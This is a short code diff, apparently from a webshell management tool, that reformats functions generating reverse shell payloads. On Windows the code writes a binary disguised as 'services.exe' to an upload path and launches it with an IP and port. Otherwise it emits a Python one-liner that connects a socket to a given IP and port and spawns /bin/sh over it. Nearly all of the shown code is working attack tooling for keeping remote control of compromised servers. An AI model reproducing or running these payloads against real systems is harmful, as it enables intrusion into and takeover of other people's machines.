@@ -5,10 +5,12 @@ from libs.config import alias, color, gget
 from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code, randint, get_ini_value_code
 from libs.functions.webshell_plugins.reverse import *
 
+
 def get_reverse_php(ip: str, port: str, upload_path: str):
     if (is_windows()):
         filename = f"{upload_path}\\\\services.exe"
-        return get_php_reverse_php()["windows"] % (filename, get_system_code(f"{filename} {ip} {port}", False))
+        return get_php_reverse_php()["windows"] % (
+            filename, get_system_code(f"{filename} {ip} {port}", False))
     else:
         return get_php_reverse_php()["else"] % (ip, port, get_ini_value_code())
 
@@ -37,10 +39,12 @@ try:
     p.wait()
 except:
     s.close(); sys.exit(0)""" % (
-            gget("webshell.root", "webshell"),ip,port,))
+            gget("webshell.root", "webshell"), ip, port,))
     else:
         return (
-            oneline_python("""python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn('/bin/sh');s.close();'""" % (ip, port))
+            oneline_python(
+                """python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn('/bin/sh');s.close();'""" %
+                (ip, port))
         )
 
 
